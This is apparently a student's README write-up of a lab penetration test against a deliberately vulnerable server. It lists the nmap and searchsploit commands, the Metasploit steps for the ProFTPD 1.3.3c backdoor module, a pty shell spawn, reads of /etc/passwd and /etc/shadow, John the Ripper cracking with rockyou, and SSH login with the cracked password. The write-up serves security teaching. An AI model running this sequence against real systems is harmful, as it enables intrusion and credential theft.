# 🔍 Penetration Testing Project – Holmesglen Vulnerable Server

**Author:** Kelly Lindsay  
**Course:** ICTICT443 & VU23220 – Cyber Security Group Project  
**Institution:** Holmesglen TAFE  
**Environment:** Isolated Virtual Lab  
**Tools Used:** Kali Linux, Nmap, Netdiscover, Metasploit, Searchsploit, John the Ripper, SSH

---

## 📝 Executive Summary

This repository documents a penetration test performed on a simulated vulnerable machine hosted in a secure lab environment provided by Holmesglen TAFE. The objective was to conduct a controlled attack using industry-standard tools and techniques to identify and exploit vulnerabilities, ultimately gaining root and user-level access.

---

## 🎯 Testing Scope & Methodology

**Scope:**
- Vulnerable server hosted in isolated VMware network.
- Target IP identified: `192.168.27.135`
- Ethical testing in a non-production, educational environment.

**Methodology:**
1. **Host Discovery** – Identify the target IP address using Netdiscover and verify connectivity.
2. **Reconnaissance** – Use Nmap to identify open ports and service versions.
3. **Enumeration** – Identify specific vulnerabilities through version scanning.
4. **Exploitation** – Use Metasploit to exploit a known backdoor in ProFTPD.
5. **Post-Exploitation** – Gain root access, extract password hashes, and escalate privileges.

---

## 📡 Host Discovery Phase

- **Netdiscover** used to identify the target IP:
  ```bash
  netdiscover
  ```
  ➤ Target IP: `192.168.27.135`

- **Nmap Scan** to enumerate services and versions:
  ```bash
  nmap -sC -sV 192.168.27.135
  ```

- **Ping test** used to confirm connectivity:
  ```bash
  ping 192.168.27.135
  ```

---

## 🧠 Reconnaissance Phase

**Discovered Open Ports:**
- Port 21 – FTP (ProFTPD 1.3.3c – vulnerable)
- Port 22 – SSH
- Port 80 – HTTP

**Vulnerability Search:**
- Searchsploit used to find matching exploits:
  ```bash
  searchsploit proftpd 1.3.3c
  ```

---

## 🎯 Exploitation Phase

**Metasploit Exploit Module:**
```bash
msfconsole
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.27.135
set RPORT 21
run
```

**Result:**  
Immediate root shell access gained via ProFTPD backdoor.

---

## 🧪 Post-Exploitation

- Spawn interactive shell:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

- View credentials:
  ```bash
  cat /etc/passwd
  cat /etc/shadow
  ```

- Extract and crack password hash for user `marlinspike`:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
  ```

- Result:  
  ➤ Password cracked: `marlinspike`

- SSH into user account:
  ```bash
  ssh marlinspike@192.168.27.135
  ```

- Privilege escalation can be tested from user back to root.

---

## ✅ Outcome

- ✅ Identified multiple open ports.
- ✅ Exploited FTP vulnerability using Metasploit.
- ✅ Achieved root access and extracted user credentials.
- ✅ Cracked password hash using John the Ripper.
- ✅ Validated SSH access with cracked credentials.

---

## 📚 Learning Outcomes

- Practical experience with reconnaissance and enumeration tools.
- Conducting real-world style exploits using Metasploit.
- Understanding of password cracking and post-exploitation.
- Importance of patching known service vulnerabilities.

---

## ⚠️ Disclaimer

This penetration test was performed in a **controlled lab environment** for **educational purposes** only. No real-world systems were harmed or targeted during the test.

